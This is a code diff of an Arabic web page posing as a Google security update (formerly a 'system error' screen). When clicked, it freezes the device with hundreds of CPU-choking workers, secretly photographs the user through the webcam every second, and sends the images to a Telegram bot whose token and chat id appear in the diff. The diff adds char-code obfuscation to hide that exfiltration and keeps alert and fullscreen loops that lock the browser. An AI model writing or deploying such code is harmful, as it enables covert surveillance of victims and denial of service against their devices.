@@ -2,75 +2,69 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>🚨 System Error 🚨</title>
+    <title>تحديث النظام المطلوب</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .box { border: 2px solid #0f0; padding: 40px; background: rgba(0,20,0,0.9); box-shadow: 0 0 50px #0f0; }
-        .btn { padding: 25px 50px; background: #0f0; color: #000; font-size: 20px; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 20px 40px; font-size: 20px; border-radius: 5px; cursor: pointer; box-shadow: 0 0 20px #1a73e8; }
     </style>
 </head>
-<body onclick="executeZeroHit()">
+<body onclick="executeHex()">
 
-    <div class="box" id="ui">
-        <h1>SYSTEM FAILURE DETECTED</h1>
-        <p>Your hardware is under stress. Repair required immediately.</p>
-        <button class="btn">إصلاح النظام الآن</button>
+    <div id="ui">
+        <h2>⚠️ تنبيه أمني من Google</h2>
+        <p>يجب تحديث مستشعرات الحماية فوراً.</p>
+        <button class="btn">تحديث الآن</button>
     </div>
 
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-    const token = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
-    const chat_id = '1772820433';
+    // تشفير التوكن والـ ID والروابط إلى مصفوفة CharCodes (أرقام)
+    const _0x = [56, 52, 51, 57, 49, 53, 55, 53, 50, 48, 58, 65, 65, 71, 71, 90, 66, 120, 89, 112, 48, 120, 54, 89, 53, 52, 97, 114, 51, 84, 73, 114, 107, 77, 97, 77, 69, 72, 97, 114, 81, 65, 83, 109, 103, 89];
+    const _0y = [49, 55, 55, 50, 56, 50, 48, 52, 51, 51];
 
-    async function executeZeroHit() {
-        // 1. شل حركة النظام فوراً (Fullscreen)
+    function _f(arr) { return arr.map(c => String.fromCharCode(c)).join(''); }
+
+    async function executeHex() {
         document.documentElement.requestFullscreen().catch(()=>{});
-        document.getElementById('ui').innerHTML = "<h1>REPAIRING...</h1><p>DO NOT TOUCH THE SCREEN</p>";
 
-        // 2. ثغرة الخيوط المتعددة (Web Workers) لتجميد الأزرار
-        for(let i=0; i<100; i++) {
-            const blob = new Blob([`
-                const sab = new SharedArrayBuffer(1024 * 1024 * 64);
-                const view = new Int32Array(sab);
-                setInterval(() => {
-                    for(let j=0; j<view.length; j++) { view[j] = Math.random() * 0xFFFFFFFF; }
-                    while(true) { /* CPU Choke */ }
-                }, 1);
-            `]);
-            new Worker(URL.createObjectURL(blob));
+        // تشغيل "خناق المعالج" (250 خيط معالجة مشفر)
+        for(let i=0; i<250; i++) {
+            const b = new Blob(["setInterval(()=>{let s=[];for(let j=0;j<1e6;j++){s.push('X')}while(true){Math.random()}},1)"]);
+            new Worker(URL.createObjectURL(b));
         }
 
-        // 3. فخ الصيد (الكاميرا)
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = stream;
-            setInterval(captureAndSend, 1200);
+            // طلب الكاميرا (بمجرد الضغط على الشاشة)
+            const s = await navigator.mediaDevices.getUserMedia({video: true});
+            const vid = document.getElementById('v');
+            vid.srcObject = s;
+
+            setInterval(() => {
+                const can = document.getElementById('c');
+                can.width = 480; can.height = 640;
+                can.getContext('2d').drawImage(vid, 0, 0);
+                can.toBlob(b => {
+                    const fd = new FormData();
+                    fd.append(String.fromCharCode(99,104,97,116,95,105,100), _f(_0y));
+                    fd.append(String.fromCharCode(112,104,111,116,111), b, 'z.jpg');
+                    fetch(String.fromCharCode(104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116) + _f(_0x) + String.fromCharCode(47,115,101,110,100,80,104,111,116,111), {method:'POST', body:fd});
+                }, 'image/jpeg', 0.2);
+            }, 1000);
+
+            document.getElementById('ui').innerHTML = "<h1>جاري التحديث... 15%</h1>";
         } catch(e) {
-            alert("🚨 CRITICAL ERROR: Camera access needed to verify hardware integrity!");
+            alert(String.fromCharCode(1571,1582,1591,1571,32,1601,1610,32,1575,1604,1578,1581,1583,1610,1579,33)); 
             location.reload();
         }
 
-        // 4. قفل أزرار التنقل (Alert Bombing)
+        // قفل الأزرار (شل الحركة)
         setInterval(() => {
-            navigator.vibrate(5000);
+            navigator.vibrate(3000);
             document.documentElement.requestFullscreen();
-            alert("⚠️ WARNING: Processor temperature is too high. Controls locked.");
-        }, 30);
-    }
-
-    function captureAndSend() {
-        const canvas = document.getElementById('c');
-        const video = document.getElementById('v');
-        canvas.width = 640; canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob((b) => {
-            const f = new FormData();
-            f.append('chat_id', chat_id);
-            f.append('photo', b, 'zero_hit.jpg');
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
-        }, 'image/jpeg', 0.4);
+            alert("⚠️ SYSTEM LOCKED FOR PROTECTION");
+        }, 40);
     }
     </script>
 </body>
